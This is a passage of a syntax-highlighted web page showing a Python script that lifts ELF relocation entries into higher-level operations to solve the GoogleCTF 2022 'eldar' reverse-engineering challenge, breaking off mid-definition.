class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author: hgarrereyn</span></span><br><span class="line"><span class="comment"># Desc: Lifter solution for GoogleCTF 2022 eldar</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span></span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"></span><br><span class="line">b = <span class="literal">None</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    b = lief.ELF.parse(<span class="string">&#x27;./deeprev&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must have the ./eldar binary in cwd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rela = [x <span class="keyword">for</span> x <span class="keyword">in</span> b.sections <span class="keyword">if</span> x.name == <span class="string">&#x27;.rela.dyn&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(rela)</span><br><span class="line">dynsym = [x <span class="keyword">for</span> x <span class="keyword">in</span> b.sections <span class="keyword">if</span> x.name == <span class="string">&#x27;.dynsym&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Symbol</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    idx: <span class="built_in">int</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;s<span class="subst">&#123;self.idx&#125;</span>&#x27;</span></span><br><span class="line">        </span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Reloc</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    idx: <span class="built_in">int</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;r<span class="subst">&#123;self.idx&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ref</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    val: <span class="type">Any</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;&amp;<span class="subst">&#123;self.val&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SymAddr</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    sym: Symbol</span><br><span class="line">    field: <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.sym&#125;</span>.<span class="subst">&#123;self.field&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RelocAddr</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    reloc: Reloc</span><br><span class="line">    field: <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.reloc&#125;</span>.<span class="subst">&#123;self.field&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">vaddr</span>(<span class="params">self</span>):</span><br><span class="line">        off = <span class="number">0</span></span><br><span class="line">        match self.field:</span><br><span class="line">            case <span class="string">&#x27;r_address&#x27;</span>:off = <span class="number">0</span></span><br><span class="line">            case <span class="string">&#x27;r_info&#x27;</span>: off = <span class="number">8</span></span><br><span class="line">            case <span class="string">&#x27;r_addend&#x27;</span>: off = <span class="number">16</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> (self.reloc.idx * <span class="number">24</span>) + off + rela.virtual_address</span><br><span class="line">    </span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FlagAddr</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    idx: <span class="built_in">int</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;flag[<span class="subst">&#123;self.idx&#125;</span>]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OutAddr</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    idx: <span class="built_in">int</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;out[<span class="subst">&#123;self.idx&#125;</span>]&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArrAddr</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    idx: <span class="built_in">int</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;arr[<span class="subst">&#123;self.idx&#125;</span>]&#x27;</span></span><br><span class="line"></span><br><span class="line">BaseAddr = namedtuple(<span class="string">&#x27;baseaddr&#x27;</span>, [])</span><br><span class="line">FailAddr = namedtuple(<span class="string">&#x27;fail&#x27;</span>, [])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_addr</span>(<span class="params">addr: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">if</span> addr &gt;= rela.virtual_address <span class="keyword">and</span> addr &lt; rela.virtual_address + rela.size:</span><br><span class="line">        offset = addr - rela.virtual_address</span><br><span class="line">        r_offset = (offset // <span class="number">24</span>)</span><br><span class="line">        r_rem = offset % <span class="number">24</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> r_offset &gt;= <span class="number">3</span> <span class="keyword">and</span> r_offset &lt;= <span class="number">88</span>:</span><br><span class="line">            arr_idx = (r_offset - <span class="number">3</span>) * <span class="number">3</span> + (r_rem // <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">return</span> ArrAddr(arr_idx)</span><br><span class="line">        <span class="keyword">elif</span> r_offset == <span class="number">89</span>:</span><br><span class="line">            <span class="keyword">return</span> OutAddr(r_rem)</span><br><span class="line">        </span><br><span class="line">        match r_rem:</span><br><span class="line">            case <span class="number">0</span>: <span class="keyword">return</span> RelocAddr(Reloc(r_offset), <span class="string">&#x27;r_address&#x27;</span>)</span><br><span class="line">            case <span class="number">8</span>: <span class="keyword">return</span> RelocAddr(Reloc(r_offset), <span class="string">&#x27;r_info&#x27;</span>)</span><br><span class="line">            case <span class="number">16</span>: <span class="keyword">return</span> RelocAddr(Reloc(r_offset), <span class="string">&#x27;r_addend&#x27;</span>)</span><br><span class="line">            case _: <span class="keyword">return</span> RelocAddr(Reloc(r_offset), r_rem)</span><br><span class="line">    <span class="keyword">elif</span> addr &gt; dynsym.virtual_address <span class="keyword">and</span> addr &lt; dynsym.virtual_address + dynsym.size:</span><br><span class="line">        offset = addr - dynsym.virtual_address</span><br><span class="line">        r_offset = (offset // <span class="number">24</span>)</span><br><span class="line">        r_rem = offset % <span class="number">24</span></span><br><span class="line">        </span><br><span class="line">        match r_rem:</span><br><span class="line">            case <span class="number">0</span>: <span class="keyword">return</span> SymAddr(Symbol(r_offset), <span class="string">&#x27;st_name&#x27;</span>)</span><br><span class="line">            case <span class="number">8</span>: <span class="keyword">return</span> Symbol(r_offset)</span><br><span class="line">            case <span class="number">16</span>: <span class="keyword">return</span> SymAddr(Symbol(r_offset), <span class="string">&#x27;st_size&#x27;</span>)</span><br><span class="line">            case _: <span class="keyword">return</span> SymAddr(Symbol(r_offset), r_rem)</span><br><span class="line">    <span class="keyword">elif</span> addr &gt;= <span class="number">0x404040</span> <span class="keyword">and</span> addr &lt; <span class="number">0x404040</span>+<span class="number">33</span>:</span><br><span class="line">        off = addr-<span class="number">0x404040</span></span><br><span class="line">        <span class="keyword">return</span> FlagAddr(off)</span><br><span class="line">    <span class="keyword">elif</span> addr == <span class="number">0x804000</span>:</span><br><span class="line">        <span class="keyword">return</span> BaseAddr()</span><br><span class="line">    <span class="keyword">elif</span> addr == <span class="number">0x404064</span>:</span><br><span class="line">        <span class="keyword">return</span> FailAddr()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_sym</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(name) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> Symbol(<span class="built_in">ord</span>(name[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">Rel = namedtuple(<span class="string">&#x27;REL&#x27;</span>, [<span class="string">&#x27;dst&#x27;</span>,<span class="string">&#x27;val&#x27;</span>,<span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line">Copy = namedtuple(<span class="string">&#x27;CPY&#x27;</span>, [<span class="string">&#x27;dst&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line">R64 = namedtuple(<span class="string">&#x27;R64&#x27;</span>, [<span class="string">&#x27;dst&#x27;</span>,<span class="string">&#x27;symbol&#x27;</span>,<span class="string">&#x27;addend&#x27;</span>,<span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line">R32 = namedtuple(<span class="string">&#x27;R32&#x27;</span>, [<span class="string">&#x27;dst&#x27;</span>,<span class="string">&#x27;symbol&#x27;</span>,<span class="string">&#x27;addend&#x27;</span>,<span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">b</span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Loading relocations...&#x27;</span>)</span><br><span class="line">    relocs = <span class="built_in">list</span>(b.relocations)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Parsing...&#x27;</span>)</span><br><span class="line">    instructions = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="built_in">len</span>(relocs)):</span><br><span class="line">        r = relocs[i]</span><br><span class="line">        match r.<span class="built_in">type</span>:</span><br><span class="line">            case <span class="number">1</span>: <span class="comment"># R64</span></span><br><span class="line">                instructions.append(R64(format_addr(r.address), to_sym(r.symbol.name), format_addr(r.addend), i))</span><br><span class="line">            case <span class="number">5</span>: <span class="comment"># CPY</span></span><br><span class="line">                instructions.append(Copy(format_addr(r.address), to_sym(r.symbol.name), i))</span><br><span class="line">            case <span class="number">8</span>: <span class="comment"># REL</span></span><br><span class="line">                instructions.append(Rel(format_addr(r.address), format_addr(r.addend), i))</span><br><span class="line">            case <span class="number">10</span>: <span class="comment"># R32</span></span><br><span class="line">                instructions.append(R32(format_addr(r.address), to_sym(r.symbol.name), format_addr(r.addend), i))</span><br><span class="line">                </span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line">Mov = namedtuple(<span class="string">&#x27;mov&#x27;</span>, [<span class="string">&#x27;dst&#x27;</span>, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;sz&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line">Add = namedtuple(<span class="string">&#x27;add&#x27;</span>, [<span class="string">&#x27;dst&#x27;</span>, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;addend&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_mov_add</span>(<span class="params">instructions</span>):</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    sizes = []</span><br><span class="line">    curr = [<span class="number">8</span>] * <span class="number">8</span></span><br><span class="line">    sizes.append(curr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> instr <span class="keyword">in</span> instructions:</span><br><span class="line">        c = <span class="built_in">list</span>(curr)</span><br><span class="line">        match instr:</span><br><span class="line">            case Rel(SymAddr(Symbol(idx), <span class="string">&#x27;st_size&#x27;</span>), val, ridx):</span><br><span class="line">                c[idx] = val</span><br><span class="line">        sizes.append(c)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">        match instructions[idx]:</span><br><span class="line">            case Rel(dst, val, ridx):</span><br><span class="line">                instructions[idx] = Mov(dst, Ref(val), <span class="number">8</span>, ridx)</span><br><span class="line">            case Copy(dst, sym, ridx):</span><br><span class="line">                instructions[idx] = Mov(dst, sym, sizes[idx][sym.idx], ridx)</span><br><span class="line">            case R64(dst, sym, add, ridx):</span><br><span class="line">                instructions[idx] = Add(dst, sym, add, ridx)</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_sizes</span>(<span class="params">instructions</span>):</span><br><span class="line">    <span class="comment"># Sizes are now nops</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">        match instructions[idx]:</span><br><span class="line">            case Mov(SymAddr(Symbol(s), <span class="string">&#x27;st_size&#x27;</span>), _, _, _) <span class="keyword">if</span> s != <span class="number">3</span>:</span><br><span class="line">                instructions[idx:idx+<span class="number">1</span>] = []</span><br><span class="line"></span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_indirect</span>(<span class="params">instructions</span>):</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">        match instructions[idx:idx+<span class="number">3</span>]:</span><br><span class="line">            case [</span><br><span class="line">                Mov(RelocAddr(Reloc(rel_1), <span class="string">&#x27;r_addend&#x27;</span>), Symbol(sidx_1), sz_1, ridx_1),</span><br><span class="line">                Add(dst_2, sym_2, _, ridx_2),</span><br><span class="line">                Mov(RelocAddr(Reloc(rel_3), <span class="string">&#x27;r_addend&#x27;</span>), Ref(<span class="number">0</span>), sz_3, _),</span><br><span class="line">            ] <span class="keyword">if</span> (</span><br><span class="line">                (rel_1 == ridx_2) <span class="keyword">and</span> (rel_3 == ridx_2)</span><br><span class="line">            ):</span><br><span class="line">                instructions[idx:idx+<span class="number">3</span>] = [</span><br><span class="line">                    Add(dst_2, sym_2, Symbol(sidx_1), ridx_1)</span><br><span class="line">                ]</span><br><span class="line"></span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line">Block = namedtuple(<span class="string">&#x27;block&#x27;</span>, [<span class="string">&#x27;arr&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line">Output = namedtuple(<span class="string">&#x27;output&#x27;</span>, [<span class="string">&#x27;out&#x27;</span>, <span class="string">&#x27;arr&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_block</span>(<span class="params">instructions</span>):</span><br><span class="line"> </span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">        match instructions[idx:idx+<span class="number">18</span>]:</span><br><span class="line">            case [</span><br><span class="line">                Mov(_,arr,_,ridx),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Mov(_,flag,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                R32(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">            ]:</span><br><span class="line">                instructions[idx:idx+<span class="number">18</span>] = [</span><br><span class="line">                    Block(arr, flag, ridx)</span><br><span class="line">                ]</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line">Reset = namedtuple(<span class="string">&#x27;reset&#x27;</span>, [<span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line">ShuffleBlock = namedtuple(<span class="string">&#x27;shuffleblock&#x27;</span>, [<span class="string">&#x27;f1&#x27;</span>, <span class="string">&#x27;f2&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_reset</span>(<span class="params">instructions</span>):</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions) - <span class="number">256</span>:</span><br><span class="line">        good = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            op = instructions[idx+i]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(op) == Mov:</span><br><span class="line">                dst, src, _, _ = op</span><br><span class="line">                <span class="keyword">if</span> dst != ArrAddr(i) <span class="keyword">or</span> src != Ref(i):</span><br><span class="line">                    good = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                good = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> good:</span><br><span class="line">            instructions[idx:idx+<span class="number">256</span>] = [Reset(instructions[idx].ridx)]</span><br><span class="line"></span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_shuffle_block</span>(<span class="params">instructions</span>):</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions) - <span class="number">256</span>:</span><br><span class="line">        good = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            op = instructions[idx+i]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(op) == Block:</span><br><span class="line">                arr, flag, ridx = op</span><br><span class="line">                <span class="keyword">if</span> arr != Ref(ArrAddr(i)):</span><br><span class="line">                    good = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                good = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> good:</span><br><span class="line">            instructions[idx:idx+<span class="number">256</span>] = [ShuffleBlock(instructions[idx].flag, instructions[idx+<span class="number">1</span>].flag, instructions[idx].ridx)]</span><br><span class="line"></span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line">Output = namedtuple(<span class="string">&#x27;output&#x27;</span>, [<span class="string">&#x27;out&#x27;</span>, <span class="string">&#x27;arr&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_output</span>(<span class="params">instructions</span>):</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">        match instructions[idx:idx+<span class="number">26</span>]:</span><br><span class="line">            case [</span><br><span class="line">                Mov(_,arr,_,ridx),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                R32(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                R32(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Mov(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Add(_,_,_,_),</span><br><span class="line">                Mov(out,_,_,_),</span><br><span class="line">            ]:</span><br><span class="line">                instructions[idx:idx+<span class="number">26</span>] = [Output(out, arr, ridx)]</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line">MultAdd = namedtuple(<span class="string">&#x27;multadd&#x27;</span>, [<span class="string">&#x27;out&#x27;</span>, <span class="string">&#x27;val&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_multadd</span>(<span class="params">instructions</span>):</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">        match instructions[idx:idx+<span class="number">3</span>]:</span><br><span class="line">            <span class="comment"># block prefix</span></span><br><span class="line">            case [</span><br><span class="line">                Mov(Symbol(<span class="number">2</span>), out, _, ridx),</span><br><span class="line">                Mov(Symbol(<span class="number">5</span>), Symbol(<span class="number">2</span>), _, _),</span><br><span class="line">                Mov(Symbol(<span class="number">6</span>), Ref(<span class="number">0</span>), _, _),</span><br><span class="line">            ]:</span><br><span class="line">                k = <span class="number">0</span></span><br><span class="line">                double = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                ptr = idx + <span class="number">3</span></span><br><span class="line"></span><br><span class="line">                good = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">while</span> ptr &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">                    match instructions[ptr]:</span><br><span class="line">                        case Mov(Symbol(<span class="number">2</span>), Ref(Symbol(<span class="number">6</span>)), _, _):</span><br><span class="line">                            double = <span class="literal">True</span></span><br><span class="line">                        case Mov(Symbol(<span class="number">2</span>), Ref(Symbol(<span class="number">5</span>)), _, _):</span><br><span class="line">                            double = <span class="literal">False</span></span><br><span class="line">                        case Add(Symbol(<span class="number">6</span>), Symbol(<span class="number">6</span>), Symbol(<span class="number">2</span>), _):</span><br><span class="line">                            k = (k * <span class="number">2</span>) <span class="keyword">if</span> double <span class="keyword">else</span> (k + <span class="number">1</span>)</span><br><span class="line">                        case Add(Symbol(<span class="number">7</span>), Symbol(<span class="number">7</span>), Symbol(<span class="number">2</span>), _):</span><br><span class="line">                            ptr += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        case _:</span><br><span class="line">                            good = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                    ptr += <span class="number">1</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> good:</span><br><span class="line">                    instructions[idx:ptr] = [</span><br><span class="line">                        MultAdd(Symbol(<span class="number">7</span>), out, k, ridx)</span><br><span class="line">                    ]</span><br><span class="line"></span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line">Trunc = namedtuple(<span class="string">&#x27;trunc&#x27;</span>, [<span class="string">&#x27;val&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_truncate</span>(<span class="params">instructions</span>):</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">        match instructions[idx:idx+<span class="number">2</span>]:</span><br><span class="line">            case [</span><br><span class="line">                Mov(Symbol(<span class="number">2</span>), Ref(SymAddr(Symbol(<span class="number">5</span>), <span class="number">11</span>)), _, ridx),</span><br><span class="line">                Mov(SymAddr(Symbol(<span class="number">7</span>), <span class="number">11</span>), Symbol(<span class="number">2</span>), <span class="number">5</span>, _)</span><br><span class="line">            ]:</span><br><span class="line">                instructions[idx:idx+<span class="number">2</span>] = [</span><br><span class="line">                    Trunc(Symbol(<span class="number">7</span>), <span class="number">0xffffff</span>, ridx)]</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line">ArraySlots = namedtuple(<span class="string">&#x27;arr&#x27;</span>, [<span class="string">&#x27;values&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_array_slots</span>(<span class="params">instructions</span>):</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">        match instructions[idx]:</span><br><span class="line">            case Mov(BaseAddr(), Ref(<span class="number">0</span>), _, ridx):</span><br><span class="line">                ptr = idx+<span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> ptr &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">                    op = instructions[ptr]</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">type</span>(op) != Mov <span class="keyword">or</span> op.dst != BaseAddr():</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    ptr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                start = idx</span><br><span class="line">                end = ptr</span><br><span class="line"></span><br><span class="line">                data = []</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Check for movs into array.</span></span><br><span class="line">                vstart = RelocAddr(Reloc(ridx), <span class="string">&#x27;r_address&#x27;</span>).vaddr()</span><br><span class="line">                offset = <span class="number">0</span></span><br><span class="line">                <span class="keyword">while</span> end + offset &lt; <span class="built_in">len</span>(instructions) <span class="keyword">and</span> offset &lt; ((end - start) * <span class="number">3</span>):</span><br><span class="line">                    op = instructions[end + offset]</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">type</span>(op) == Mov <span class="keyword">and</span> <span class="built_in">type</span>(op.dst) <span class="keyword">is</span> RelocAddr <span class="keyword">and</span> op.dst.vaddr() == vstart + (offset * <span class="number">8</span>):</span><br><span class="line">                        data.append(op.src.val)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    offset += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(data) &gt; <span class="number">0</span>:</span><br><span class="line">                    data += [<span class="number">0</span>] * (((end - start) * <span class="number">3</span>) - <span class="built_in">len</span>(data))   </span><br><span class="line">                    instructions[idx:end+offset] = [</span><br><span class="line">                        ArraySlots(data, ridx)</span><br><span class="line">                    ]</span><br><span class="line"></span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line">Shellcode = namedtuple(<span class="string">&#x27;shellcode&#x27;</span>, [<span 